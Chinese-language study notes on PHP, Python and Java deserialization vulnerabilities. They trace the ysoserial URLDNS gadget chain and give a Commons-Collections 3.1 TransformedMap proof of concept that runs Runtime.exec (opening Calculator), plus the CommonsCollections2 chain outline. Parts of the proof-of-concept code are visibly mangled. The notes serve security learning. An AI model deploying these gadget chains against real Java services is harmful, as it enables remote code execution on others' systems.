# PHP 反序列化

PHP中序列化一个对象需要调用serialize()方法，之后会调用__sleep()方法执行自定义操作后，序列化数据生成，而JAVA的wrireObject()是可以重写的。反序列化后会调用__wakeup()方法。

PHP中的魔术方法__sleep(),__wakeup()是在序列化操作的前后执行而不是序列化时。

PHP反序列化漏洞的利用点是在序列化时将一些属性修改成我们想要的数据 ，从而在之后的执行流程中进行危险操作，而不是在__wakeup()中，因为根本不可控，除非__wakeup()本身写的很危险

# Python 反序列化

Python反序列化和Java、PHP有个显著的区别，就是Python的反序列化过程实际上是在执行一个基于栈的虚拟机。

我们可以向栈上增、删对象，也可以执行一些指令，比如函数的执行等，甚至可以用这个虚拟机执行一个完整的应用程序。

# Java 反序列化

Java的反序列化和PHP的反序列化其实有些类似，都是将一个对象中的属性按照某种特定的格式生成一段数据流。
在反序列化的时候再按照这个格式将属性取出，再赋值给新的对象。

在序列化是会调用writeObject()，参数是ObjectOutSteam类型。

我们可以将任何数据写入这个对象输出流，在反序列化是调用重写好的readObject()来读取前面写入的内容，比PHP序列化操作更自定义

## URLDNS

urldns利用链并不能执行命令而是发起一次DNS查询，传递的payload是url，但是在检测反序列化漏洞存在与否很方便

 - 不能确定目标服务器上JDK，commons-collections等库的版本，urldns利用链有内置类构造
 - 目标服务器没有回显时，就很方便

ysoserial工具就有URLDNS的gadget chain:

```java 
public Object getObject(final String url) throws Exception {

        //Avoid DNS resolution during payload creation
        //Since the field <code>java.net.URL.handler</code> is transient, it will not be part of the serialized payload.
        URLStreamHandler handler = new SilentURLStreamHandler();

        HashMap ht = new HashMap(); // HashMap that will contain the URL
        URL u = new URL(null, url, handler); // URL to use as the Key
        ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.

        Reflections.setFieldValue(u, "hashCode", -1); 
        // During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.
        //在上述放置期间，将计算并缓存URL的hashCode。这将重置，以便下次将hashCode称为DNS查找时将被触发

        return ht;
}

```

> 注释中写道 进行hashcode操作时会触发一次DNS请求

 ysoserial源码的URLDNS类的getObject方法返回将要被序列化的类HashMap

将java.net.URl对象作为key，url作为value放入HashMap对象中

 HashMap的readObejct()代码：

 ```java
    private void readObject(java.io.ObjectInputStream s)
        throws IOException, ClassNotFoundException {
        // Read in the threshold (ignored), loadfactor, and any hidden stuff
        s.defaultReadObject();
        reinitialize();
        if (loadFactor <= 0 || Float.isNaN(loadFactor))
            throw new InvalidObjectException("Illegal load factor: " + loadFactor);
        s.readInt();                // Read and ignore number of buckets
        int mappings = s.readInt(); // Read number of mappings (size)
        if (mappings < 0)
            throw new InvalidObjectException("Illegal mappings count: " + mappings);
        else if (mappings > 0) { // (if zero, use defaults)
            // Size the table using given load factor only if within
            // range of 0.25...4.0
            float lf = Math.min(Math.max(0.25f, loadFactor), 4.0f);
            float fc = (float)mappings / lf + 1.0f;
            int cap = ((fc < DEFAULT_INITIAL_CAPACITY) ?
                       DEFAULT_INITIAL_CAPACITY :
                       (fc >= MAXIMUM_CAPACITY) ?
                       MAXIMUM_CAPACITY :
                       tableSizeFor((int)fc));
            float ft = (float)cap * lf;
            threshold = ((cap < MAXIMUM_CAPACITY && ft < MAXIMUM_CAPACITY) ?
                         (int)ft : Integer.MAX_VALUE);

            // Check Map.Entry[].class since it's the nearest public type to
            // what we're actually creating.
            SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, cap);
            @SuppressWarnings({"rawtypes","unchecked"})
            Node<K,V>[] tab = (Node<K,V>[])new Node[cap];
            table = tab;

            // Read the keys and values, and put the mappings in the HashMap
            for (int i = 0; i < mappings; i++) {
                @SuppressWarnings("unchecked")
                    K key = (K) s.readObject();
                @SuppressWarnings("unchecked")
                    V value = (V) s.readObject();
                putVal(hash(key), key, value, false, false);
            }
        }
    }
 ```

对放入的key进行hash计算`putVal(hash(key), key, value, false, false);`

```java
    static final int hash(Object key) {
        int h;
        return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
    }
```

计算hash过程中调用key也就是URL对象的`hashcode()`方法

```java
    public synchronized int hashCode() {
        if (hashCode != -1)
            return hashCode;

        hashCode = handler.hashCode(this);
        return hashCode;
    }
```

触发DNS请求在`handler.hashCode(this)`内，handler是抽象类`URLStreamHandler`的子类

这里需要hashCode为-1是才会触发handler.hashCode()，在序列化生成payload时将url对象put到HashMap时会进行一次hashcode计算

所以需要使用反射在put操作后手动修改url对象的hashCode值为-1

```java
Class clazz = url.getClass();
Field f = clazz.getDeclaredField("hashCode");
f.setAccessible(true);
f.set(url,-1);
```

URLStreamHandler类的hashCode方法这里调用`getHostAddress()`触发DNS

```java
protected int hashCode(URL u) {
        int h = 0;

        // Generate the protocol part.
        String protocol = u.getProtocol();
        if (protocol != null)
            h += protocol.hashCode();

        // Generate the host part.
        InetAddress addr = getHostAddress(u);
        if (addr != null) {
            h += addr.hashCode();
        } else {
            String host = u.getHost();
            if (host != null)
                h += host.toLowerCase().hashCode();
        }

        // Generate the file part.
        String file = u.getFile();
        if (file != null)
            h += file.hashCode();

        // Generate the port part.
        if (u.getPort() == -1)
            h += getDefaultPort();
        else
            h += u.getPort();

        // Generate the ref part.
        String ref = u.getRef();
        if (ref != null)
            h += ref.hashCode();

        return h;
    }
```


> ysoserial防止在生成payload是触发请求，所以重写了handle-SilentURLStreamHandler

## commons-collections-3.1

### TransformedMap调用链

```java
    public static void main(String[] args) {
        String cmd  = "open /System/Applications/Calculator.app";
        String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.getRuntime()),
                new InvokerTransformer("exec", new Class[]{String.class}, 
                new Object[]{cmd})
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        //chainedTransformer.transform(null);

        //创建AnnotationInvocationHandler对象 对map.class的动态代理对象
        Map map = new HashMap();

        map.put("value", "value");

        Map transformedMap = TransformedMap.decorate(map, null, chainedTransformer);

//        for (Object obj : transformedMap.entrySet()) {
//            Map.Entry entry = (Map.Entry) obj;
//
//            // setValue最终调用到InvokerTransformer的transform方法,从而触发Runtime命令执行调用链
//            entry.setValue("test");
//        }

        Class ann_clazz = Class.forName(ANN_INV_HANDLER_CLASS);

        // 获取AnnotationInvocationHandler类的构造方法
        Constructor constructor = ann_clazz.getDeclaredConstructor(Class.class, Map.class);

        // 设置构造方法的访问权限
        constructor.setAccessible(true);

        //AnnotationInvocationHandler类实例
        Object instance = constructor.newInstance(Target.class, transformedMap);

        // 创建用于存储payload的二进制输出流对象 创建Java对象序列化输出流对象
        ObjectOutputStream out = new ObjectOutputStream(new ByteArrayOutputStream());
        out.writeObject(instance);
        out.flush();
        out.close();

        byte[] bytes = baos.toByteArray();

        // 通过反序列化输入流(bais),创建Java对象输入流(ObjectInputStream)对象
        ObjectInputStream in = new ObjectInputStream(banew ByteArrayInputStream(bytes)is);

        in.readObject();
        in.close();

    }
}
```
> AnnotationInvocationHandler类是私有类，不能直接new出来。


调用TransformedMap的setValue/put/putAll中的任意方法都会调用InvokerTransformer类的transform方法，就会触发命令执行

- 可以触发此调用链的场景

 - 只要在Java的API中的任何一个类实现了java.io.Serializable接口
 - 可以传入构建的TransformedMap对象
 - 要有调用TransformedMap中的setValue/put/putAll中的任意方法一个方法的类
 - 在Java反序列化的时候触发InvokerTransformer类的transform方法实现RCE

 > 在jdk1.7u80中调用链可以顺利执行，jdk1.8中AnnotationInvocationHandler类的readobject()中没有调用entrty.setValue()方法。无法执行，代码如下。


- 1.7
```java
private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException {
        var1.defaultReadObject();
        AnnotationType var2 = null;

        try {
            var2 = AnnotationType.getInstance(this.type);
        } catch (IllegalArgumentException var9) {
            throw new InvalidObjectException("Non-annotation type in annotation serial stream");
        }

        Map var3 = var2.memberTypes();
        Iterator var4 = this.memberValues.entrySet().iterator();

        while(var4.hasNext()) {
            Entry var5 = (Entry)var4.next();
            String var6 = (String)var5.getKey();
            Class var7 = (Class)var3.get(var6);
            if (var7 != null) {
                Object var8 = var5.getValue();
                if (!var7.isInstance(var8) && !(var8 instanceof ExceptionProxy)) {
                    //这里调用的setValue()->checkSetValue()->valueTransformer.transform(value)
                    var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + "[" + var8 + "]")).setMember((Method)var2.members().get(var6)));
                }
            }
        }

    }

```

- 1.8

```java
    private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException {
        GetField var2 = var1.readFields();
        Class var3 = (Class)var2.get("type", (Object)null);
        Map var4 = (Map)var2.get("memberValues", (Object)null);
        AnnotationType var5 = null;

        try {
            var5 = AnnotationType.getInstance(var3);
        } catch (IllegalArgumentException var13) {
            throw new InvalidObjectException("Non-annotation type in annotation serial stream");
        }

        Map var6 = var5.memberTypes();
        LinkedHashMap var7 = new LinkedHashMap();

        String var10;
        Object var11;
        for(Iterator var8 = var4.entrySet().iterator(); var8.hasNext(); var7.put(var10, var11)) {
            Entry var9 = (Entry)var8.next();
            var10 = (String)var9.getKey();
            var11 = null;
            Class var12 = (Class)var6.get(var10);
            if (var12 != null) {
                var11 = var9.getValue();
                if (!var12.isInstance(var11) && !(var11 instanceof ExceptionProxy)) {
                    //zheli 
                    var11 = (new AnnotationTypeMismatchExceptionProxy(var11.getClass() + "[" + var11 + "]")).setMember((Method)var5.members().get(var10));
                }
            }
        }

        AnnotationInvocationHandler.UnsafeAccessor.setType(this, var3);
        AnnotationInvocationHandler.UnsafeAccessor.setMemberValues(this, var7);
    }
```

### LazyMap调用链 ysoserial-CommonsCollections1 

后半段执行命令的利用链和上面的一致，不同的是触发方式 

## commons-collections4:4.0

ysoserial CommonsCollections2调用链

```java
/*
	Gadget chain:
		ObjectInputStream.readObject()
			PriorityQueue.readObject()
				...
					TransformingComparator.compare()
						InvokerTransformer.transform()
							Method.invoke()
								Runtime.exec()
 */
```